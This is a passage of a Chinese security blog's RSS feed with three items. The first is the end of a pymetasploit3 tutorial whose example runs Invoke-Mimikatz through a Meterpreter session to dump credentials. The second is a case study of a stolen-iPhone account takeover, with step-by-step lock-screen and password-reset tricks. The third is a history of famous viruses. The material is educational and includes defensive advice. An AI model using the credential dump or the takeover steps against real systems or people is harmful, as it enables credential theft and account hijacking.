 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方法三是在找到某个字符串后停止收集数据。 对于非常复杂的命令，这通常是最一致的。 下面我们将查找字符串“Address”和“HWtype”，我们知道它存在于 Linux上 arp 命令的输出中。 在处理 Meterpreter 会话时，字符串“[ - ]”和“[+]”通常是很好的默认结束字符串，因为当命令完成或失败时，Metasploit 通常会在其输出中使用这些字符串。 但是 Metasploit 的输出在一个命令到下一个命令之间是不一致的，所以要谨慎选择一致的结束字符串，否则您可能会在稍后读取数据缓冲区并让前一个命令的输出扰乱您的新命令的输出。 只要在会话的输出中读取一个选定的结束字符串，就会返回到该时刻之前收集的所有数据。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; cmd = &amp;#39;arp&amp;#39; 
&amp;gt;&amp;gt;&amp;gt; end_strs = [&amp;#39;Address&amp;#39;, &amp;#39;HWtype&amp;#39;] 
&amp;gt;&amp;gt;&amp;gt; shell.run_with_output(cmd, end_strs=end_strs) 
&amp;#39;\n Address                  HWtype  HWaddress           Flags Mask […]&amp;#39; 
&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假设您在 Windows 主机上获得了 Meterpreter shell，您还可以运行 PowerShell 命令。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt;&amp;gt; met_shell = client.sessions.session(&amp;#39;2&amp;#39;) 
&amp;gt;&amp;gt;&amp;gt; psh_sc ript = &amp;#39;/home/user/sc ripts/Invoke-Mimikatz.ps1&amp;#39; 
&amp;gt;&amp;gt;&amp;gt; met_shell.import_psh(psh_sc ript) 
&amp;gt;&amp;gt;&amp;gt; met_shell.run_psh_cmd(&amp;#39;Invoke-Mimikatz&amp;#39;)
 # Some time passes &amp;#39;Mimikatz output…&amp;#39;
 &amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单概述了一下 pymetasploit3 的基本功能，现在就用一个小 Python 脚本替代你的工具吧！&lt;/p&gt;&lt;p&gt;来源：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.coalfire.com/The-Coalfire-Blog/May-2019/pymetasploit3-Metasploit-Automation-Library&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;coalfire.com/The-Coalfi&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;re-Blog/May-2019/pymetasploit3-Metasploit-Automation-Library&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-15-78328450</guid>
<pubDate>Thu, 15 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>被盗的 iphone 是怎样被解锁的</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-14-78123742.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/78123742&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0e5fb0b2a2bc980b74cf0ccd1d08e67e_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;即使你的 iPhone 受到六位数密码和touch ID指纹的双重保护，黑客同样能解锁你的手机。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;背景&lt;/h2&gt;&lt;p&gt;一名用户的 iPhone 6s 被偷之后不久，那个小偷不仅重置了他的一些在线服务密码，如Apple ID，而且还伪装成他，与银行进行联系，并尝试重置他银行账户的密码。不过幸运的是，犯罪分子并没有成功取出他银行卡中的钱，但是为什么可以重置他Apple ID的密码呢？不是有密码和指纹保护的嘛！&lt;/p&gt;&lt;p&gt;为了更好地理解这种情况，我们收集了更多的信息：&lt;/p&gt;&lt;p&gt;a) 这是一次有针对性的攻击事件吗？我的意思是，攻击者是否在此之前曾经通过网络钓鱼等方式获取到了这位用户的凭证，然后又专门来盗取他的iPhone手机？&lt;/p&gt;&lt;p&gt;这种可能性不大。因为这名用户表示，在手机被偷之前，身上并没有发生任何的异常事件。&lt;/p&gt;&lt;p&gt;b) 是否包含受害者信息的身份证或其他文件也被盗了？因为对于攻击者而言，用户的姓名或者电子邮件地址也是非常重要的数据。&lt;/p&gt;&lt;p&gt;事实证明，这类事情也没有发生过。&lt;/p&gt;&lt;p&gt;c) 手机被盗多久之后犯罪分子就解锁了iPhone和SIM卡呢？&lt;/p&gt;&lt;p&gt;大概两小时左右。&lt;/p&gt;&lt;p&gt;d) iPhone的解锁密码是否为弱密码？&lt;/p&gt;&lt;p&gt;不是。这个6位数的密码并不好猜，而且解锁密码与这名用户的车牌号以及其他的个人信息没有任何的关系。&lt;/p&gt;&lt;p&gt;鉴于此次事件如此的蹊跷，我们决定深入分析，看看受害者的iPhone到底是如何被解锁的。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-87efe8cbb314755d15c30ce670751b75_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;512&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;768&quot; data-original=&quot;https://pic2.zhimg.com/v2-87efe8cbb314755d15c30ce670751b75_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-87efe8cbb314755d15c30ce670751b75_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;512&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;768&quot; data-original=&quot;https://pic2.zhimg.com/v2-87efe8cbb314755d15c30ce670751b75_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-87efe8cbb314755d15c30ce670751b75_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;时间轴&lt;/h2&gt;&lt;p&gt;这名用户的手机是在某个下午被盗的，我们对事件的脉络进行了梳理，具体信息如下：&lt;/p&gt;&lt;p&gt;a)14:00  手机被盗；&lt;/p&gt;&lt;p&gt;b)16:03  用户激活了iPhone的“丢失模式”，并且通过 iCloud 远程清除了手机中的数据；&lt;/p&gt;&lt;p&gt;c)16:28  用户Google账户的密码被修改；&lt;/p&gt;&lt;p&gt;d)16:37  用户收到了一封邮件，邮件中包含一条重置Apple ID密码的链接；&lt;/p&gt;&lt;p&gt;e)16:38  又收到一封邮件，通知用户Apple ID密码已被更改;&lt;/p&gt;&lt;p&gt;f)16:43  一封新邮件，通知 iCloud 已经定位到了这台iPhone手机；&lt;/p&gt;&lt;p&gt;g)16:43  另一封新邮件，称 iCloud 已经清除了这台iPhone手机中的数据；&lt;/p&gt;&lt;p&gt;正如所见，用户Google账号和Apple账号的密码已经被犯罪分子重置了。 在没有密码的情况下，想要解锁 iPhone 手机几乎是不可能的。那么犯罪分子到底做了什么呢？&lt;/p&gt;&lt;p&gt;为此，我们开始研究实现这一切的可能性：&lt;/p&gt;&lt;p&gt;1）如果要修改Google账号的密码，首先要知道用户电子邮箱的地址。那么犯罪分子是怎么得到用户邮箱地址的呢？&lt;/p&gt;&lt;p&gt;用户手机在锁屏状态下是不会泄漏邮箱地址的，所以犯罪分子不可能从手机屏幕上获取用户Gmail邮箱的地址。&lt;/p&gt;&lt;p&gt;2）有没有办法从设备的IMEI来发现Apple ID呢？&lt;/p&gt;&lt;p&gt;我们在网上搜索并找到了这种付费服务：“从给定的IMEI中发现Apple的ID”。但是这些服务并不是在线操作的，通常需要24至48小时才能获得所需信息。但是犯罪分子只花了两小时就拿到了用户的Apple ID，所以这与我们的情况不符。&lt;/p&gt;&lt;p&gt;3）是否可以通过手机号码来找出用户的Gmail账号呢？&lt;/p&gt;&lt;p&gt;我们再次进行了搜索，发现Google提供了几种方法来帮助用户找回邮箱账号。例如与账号绑定的手机号或者用户姓名。由于这种情况下，犯罪分子可以轻易地获取到用户的手机号，而通过手机号来查找用户的姓名其实也并不难。所以，我们打算从这里开始入手……&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;情景模拟&lt;/h2&gt;&lt;p&gt;为了弄清楚事情的真相，我们就从犯罪分子通过手机号来查找用户的姓名开始入手。首先，用户重新购买一台新的iPhone 6s手机，并且将这台新手机设置成与被盗手机一样（包括Google账号和Apple账号），这样，我们就能最大程度地还原真实场景了。&lt;/p&gt;&lt;p&gt;为了获取手机号，我们从iPhone上取出SIM卡并插入另一部手机中。与真实场景相同，SIM卡并没有设置PIN码。在另一部手机中，我们可以轻易获取到用户的手机号码。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d8abe05b8e2f28f709a5992864946a88_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;587&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;587&quot; data-original=&quot;https://pic1.zhimg.com/v2-d8abe05b8e2f28f709a5992864946a88_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d8abe05b8e2f28f709a5992864946a88_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;587&quot; data-rawheight=&quot;456&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;587&quot; data-original=&quot;https://pic1.zhimg.com/v2-d8abe05b8e2f28f709a5992864946a88_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-d8abe05b8e2f28f709a5992864946a88_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;获取到用户的手机号之后，我们就可以在搜索引擎上来查找用户的姓名了。但不幸的是，我们什么也没找到。&lt;/p&gt;&lt;p&gt;接下来，我们便尝试用手机号在Facebook上进行查找。如果用户的Facebook账号绑定了手机的话，我们就可以直接通过手机号来查找到这名用户了。与刚才一样，我们还是什么也没找到。&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;WhatsApp+锁屏通知=攻击成功&lt;/h2&gt;&lt;p&gt;我突然想起来，如果你在一个&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/WhatsApp&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;WhatsApp&lt;/a&gt;的讨论组里，收到一条陌生人发来的信息，那么信息上方将会显示用户姓名和手机号（例如9999-9999～Mike Arnold）。所以，如果我们可以用这台锁屏的iPhone来向WhatsApp讨论组发送信息的话，我们就可以获取到用户的姓名了。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-67e5726783b9a97f42c48f132a528dd8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;226&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;660&quot; data-original=&quot;https://pic1.zhimg.com/v2-67e5726783b9a97f42c48f132a528dd8_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-67e5726783b9a97f42c48f132a528dd8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;226&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;660&quot; data-original=&quot;https://pic1.zhimg.com/v2-67e5726783b9a97f42c48f132a528dd8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-67e5726783b9a97f42c48f132a528dd8_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;首先，我们要确保这台iPhone手机会在锁屏界面显示WhatsApp的通知信息，于是我们向其发送了一条信息，这条信息也正如我们期待的那样显示在了锁屏界面中。接下来，我们还可以使用3D touch功能直接在锁屏界面上回复消息。&lt;/p&gt;&lt;p&gt;准备完毕之后，我们需要创建一个讨论组，然后把这位用户手机号所绑定的WhatsApp账号拉进讨论组里。由于加入讨论组是不需要进行验证的，所以进入讨论组之后，iPhone锁屏界面上便会出现了一条新的通知消息，以告诉用户他新加入了一个讨论组。当然了，讨论组中还有一些用于测试的其他用户。&lt;/p&gt;&lt;p&gt;接下来，我们在讨论组中发了一条信息，这条信息也成功在iPhone的锁屏界面上显示了。然后我们利用3D touch功能来回复这条信息，这样就成功获取到了用户的姓名。&lt;/p&gt;&lt;p&gt;下一步要做的，就是将我们所获取到的信息（手机号和用户姓名）填入Google的表单，然后获取用户的电子邮箱地址。&lt;br/&gt; &lt;/p&gt;&lt;h2&gt;修改Google账号的密码&lt;/h2&gt;&lt;p&gt;现在，我们就可以重现攻击者修改Google账户密码的操作了。操作步骤如下：&lt;/p&gt;&lt;p&gt;1.  进入Google的登录界面；&lt;/p&gt;&lt;p&gt;2.  选择“忘记密码”选项；&lt;/p&gt;&lt;p&gt;3.  在“你所能记住的最后一个密码”中随便填写一些数据；&lt;/p&gt;&lt;p&gt;4.  接下来，Google会要求你输入与该邮箱绑定的手机号码。在这一步中，Google会显示部分手机号码，但也足够验证手机号的正确性了。&lt;/p&gt;&lt;p&gt;5.  输入手机号码，Google会通过短信向iPhone发送一个验证码；&lt;/p&gt;&lt;p&gt;6.  填写完验证码之后，Google便会要求我们设置新的邮箱密码；&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5be2406ddcee003ef5ee000a8e760342_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;493&quot; data-rawheight=&quot;461&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;493&quot; data-original=&quot;https://pic3.zhimg.com/v2-5be2406ddcee003ef5ee000a8e760342_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5be2406ddcee003ef5ee000a8e760342_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;493&quot; data-rawheight=&quot;461&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;493&quot; data-original=&quot;https://pic3.zhimg.com/v2-5be2406ddcee003ef5ee000a8e760342_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-5be2406ddcee003ef5ee000a8e760342_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;很简单吧？其实只要犯罪分子拿到了你的手机或者SIM卡、以及你的姓名，他们就可以在几分钟之内重置你Gmail邮箱的密码。&lt;br/&gt; &lt;br/&gt; &lt;/p&gt;&lt;p&gt;&lt;b&gt;修改Apple ID的密码&lt;/b&gt;&lt;/p&gt;&lt;p&gt;接下来，我们使用获取到的Google邮箱地址作为Apple ID的账号来尝试进行登录。与此前一样，先选择“忘记密码”选项，然后系统会将密码重置链接通过邮件发送至你的邮箱。剩下的操作就非常简单了，想必大家也都知道。最后，我们成功地修改了用户苹果账号的密码。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cc84828522512258eddc14b9b2cedca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;622&quot; data-rawheight=&quot;375&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;622&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cc84828522512258eddc14b9b2cedca_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cc84828522512258eddc14b9b2cedca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;622&quot; data-rawheight=&quot;375&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;622&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cc84828522512258eddc14b9b2cedca_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cc84828522512258eddc14b9b2cedca_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;解锁“新的”iPhone&lt;/b&gt;&lt;/p&gt;&lt;p&gt;当iPhone丢失之后，很多用户可能会远程锁定并擦除iPhone中的数据。但是当iPhone数据被远程清除之后，iPhone会要求你输入此前设备所绑定的Apple ID和密码，如果犯罪分子知道你的Apple ID和密码的话，他们就可以将这台iPhone当作一台全新的手机来使用了。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;建议&lt;/b&gt;&lt;/p&gt;&lt;p&gt;随着智能手机的功能越来越多，在方便了用户的同时，我们也应该学会如何保护自己的安全。为此，我们给大家提供了以下建议：&lt;/p&gt;&lt;p&gt;1.  禁止手机在锁屏状态下显示通知的详细信息；&lt;/p&gt;&lt;p&gt;2.  为SIM卡设置PIN码（密码保护），如果您的手机丢失或被盗了，可以大大降低被冒充的风险；&lt;/p&gt;&lt;p&gt;3.  如果可以的话，开启网络服务的双因素身份验证功能，双因素身份验证意味着您必须提供至少两种方法的组合来向您正在进行的系统证明您的身份。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;原文链接：&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//securityaffairs.co/wordpress/52432/hacking/unlocked-stolen-iphone-6s.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;securityaffairs.co/word&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;press/52432/hacking/unlocked-stolen-iphone-6s.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;参考安全客作者 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//bobao.360.cn/member/contribute%3Fuid%3D2606963099&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;WisFree&lt;/a&gt; 翻译&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-14-78123742</guid>
<pubDate>Wed, 14 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>世界上那些久负盛名的电脑病毒，你中了几个？</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-13-77958872.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/77958872&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一提到电脑病毒，全球的计算机用户都要抖一抖。看看它干的那些事儿：硬盘数据被清空，盗取用户隐私信息，计算机死机，网络连接被掐断，好好的机器变成了毒源，开始传染其他计算机……下面小编就来盘点一下世界上那些令人闻风丧胆的电脑病毒，希望你不是受害者之一！（以下排名不分先后）&lt;/p&gt;&lt;h2&gt;1. CIH 病毒&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-62f915ba732a9ff8202d900a89ba9e08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;584&quot; data-rawheight=&quot;376&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;584&quot; data-original=&quot;https://pic1.zhimg.com/v2-62f915ba732a9ff8202d900a89ba9e08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-62f915ba732a9ff8202d900a89ba9e08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;584&quot; data-rawheight=&quot;376&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;584&quot; data-original=&quot;https://pic1.zhimg.com/v2-62f915ba732a9ff8202d900a89ba9e08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-62f915ba732a9ff8202d900a89ba9e08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;说到CIH病毒，可真给国人“增光”，因为这是一位名叫陈盈豪的台湾大学生所编写的，其名称源自作者名字的拼音或注音（&lt;b&gt;C&lt;/b&gt;hen &lt;b&gt;I&lt;/b&gt;ng-&lt;b&gt;h&lt;/b&gt;au）缩写。最早随国际两大盗版集团贩卖的盗版光盘在欧美等地广泛传播，后来经互联网各网站互相转载，使其迅速传播。&lt;/p&gt;&lt;p&gt;它的厉害之处就在于，其他病毒破坏的都是电脑软件（充其量也就是操作系统、数据文件一级），而CIH破坏的是电脑硬件（让电脑无法开机）！当时恢复的方法，除了彻底清除硬盘数据外，还需要借助专业工具重写主板BIOS。在2001年及2002的时候这个病毒的还死灰复燃过几次，真是打不死的小强啊。也正是从那个时代开始，杀毒厂商才冒出了所谓的专杀工具，而主板厂商也因此开发出了双BIOS这样一些很奇葩的设计。&lt;/p&gt;&lt;h2&gt;2. 梅利莎病毒&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-19957a27febcf04820cdd3b71a3e38ab_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;713&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic4.zhimg.com/v2-19957a27febcf04820cdd3b71a3e38ab_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-19957a27febcf04820cdd3b71a3e38ab_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;713&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic4.zhimg.com/v2-19957a27febcf04820cdd3b71a3e38ab_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-19957a27febcf04820cdd3b71a3e38ab_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;1999年3月26日，星期五，梅利莎病毒登上了全球各地报纸的头版。估计数字显示，这个Word宏脚本病毒感染了全球15%~20%的商用 PC。病毒传播速度之快，令英特尔公司、微软公司、以及其他许多使用Outlook软件的公司措手不及，为了防止损害，他们被迫关闭整个电子邮件系统。&lt;/p&gt;&lt;p&gt;梅利莎通过微软的Outlook电子邮件软件，向用户通讯簿名单中的50位联系人发送邮件来传播自身。该邮件包含以下这句话：“这就是你要的文件，不要给别人看（Here is that document you asked for， don&amp;#39;t show anybody else）”，此外夹带一个Word文档附件。而单击这个文件(成千上万毫无疑虑的用户都是这么做的)，就会使病毒感染主机并且不断自我复制。&lt;/p&gt;&lt;p&gt;更加令人恼火的事情还在后头——一旦被激活，病毒就用动画片《辛普森一家》(The Simpsons)的台词修改用户的Word文档。&lt;/p&gt;&lt;h2&gt;3. 红色代码&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6e3d2db53f5f61328918ea2ea2993b62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;398&quot; data-rawheight=&quot;291&quot; class=&quot;content_image&quot; width=&quot;398&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6e3d2db53f5f61328918ea2ea2993b62_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;398&quot; data-rawheight=&quot;291&quot; class=&quot;content_image lazy&quot; width=&quot;398&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6e3d2db53f5f61328918ea2ea2993b62_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;“红色代码”病毒是2001年7月15日发现的一种网络蠕虫病毒，感染运行Microsoft IIS Web服务器的计算机。其传播所使用的技术可以充分体现网络时代网络安全与病毒的巧妙结合，将网络蠕虫、计算机病毒、木马程序合为一体，开创了网络病毒传播的新路，可称之为划时代的病毒。如果稍加改造，将是非常致命的病毒，可以完全取得所攻破计算机的所有权限并为所欲为，可以盗走机密数据，严重威胁网络安全。&lt;/p&gt;&lt;h2&gt;4. &lt;b&gt;爱虫病毒&lt;/b&gt;(ILOVEYOU)&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-204caf9a0dd63b8e478f3a70cc95337e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;415&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;500&quot; data-original=&quot;https://pic3.zhimg.com/v2-204caf9a0dd63b8e478f3a70cc95337e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-204caf9a0dd63b8e478f3a70cc95337e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;415&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;500&quot; data-original=&quot;https://pic3.zhimg.com/v2-204caf9a0dd63b8e478f3a70cc95337e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-204caf9a0dd63b8e478f3a70cc95337e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;它是一个Visual Basic脚本，设计精妙，还有令人难以抗拒的诱饵——爱的诺言。2000年5月3日，“我爱你”蠕虫病毒首次在香港被发现。&lt;/p&gt;&lt;p&gt;爱虫跟梅利莎类似也是通过Outlook电子邮件系统传播，不过邮件主题变为了“I Love You”，打开病毒附件后，就会自动传播。该病毒在很短的时间内就袭击了全球无以数计的电脑，并且，它还是个很挑食的病毒，专喜欢那些具有高价值IT资源的电脑系统：比如美国国安部门、CIA、英国国会等政府机构、股票经纪及那些著名的跨国公司等。“爱虫”病毒是迄今为止发现的传染速度最快而且传染面积最广的计算机病毒。&lt;/p&gt;&lt;h2&gt;5. SQL Slammer蠕虫（蓝宝石蠕虫）&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7b5add4b8f9ad82a306b1d8050a93ad8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;400&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic1.zhimg.com/v2-7b5add4b8f9ad82a306b1d8050a93ad8_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7b5add4b8f9ad82a306b1d8050a93ad8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;400&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;600&quot; data-original=&quot;https://pic1.zhimg.com/v2-7b5add4b8f9ad82a306b1d8050a93ad8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7b5add4b8f9ad82a306b1d8050a93ad8_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;由于SQL Slammer爆发的日期是星期六，破坏所造成的金钱损失并不大。尽管如此，它仍然冲击了全球约50万台服务器，韩国的在线能力瘫痪长达12小时。&lt;/p&gt;&lt;p&gt;SQL Slammer也被称为“蓝宝石”(Sapphire)，2003年1月25日首次出现。它是一个非同寻常的蠕虫病毒，给互联网的流量造成了显而易见的负面影响。有意思的是，它的目标并非终端计算机用户，而是服务器。它是一个单包的、长度为376字节的蠕虫病毒，它随机产生IP地址，并向这些IP地址发送自身。如果某个IP地址恰好是一台运行着未打补丁的微软SQL服务器桌面引擎(SQL Server Desktop Engine)软件的计算机，它也会迅速开始向随机IP地址的主机开火，发射病毒。&lt;/p&gt;&lt;p&gt;正是运用这种效果显著的传播方式，SQL Slammer在十分钟之内感染了7.5万台计算机。庞大的数据流量令全球的路由器不堪重负，如此循环往复，更高的请求被发往更多的路由器，导致它们一个个被关闭。在补丁和病毒专杀软件出现之前，这种病毒造成了10亿美元以上的损失。&lt;/p&gt;&lt;h2&gt;6.  冲击波、霸王虫(Sobig.F)和震荡波&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9e184cc578698db8ea57c33fd7624177_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;318&quot; 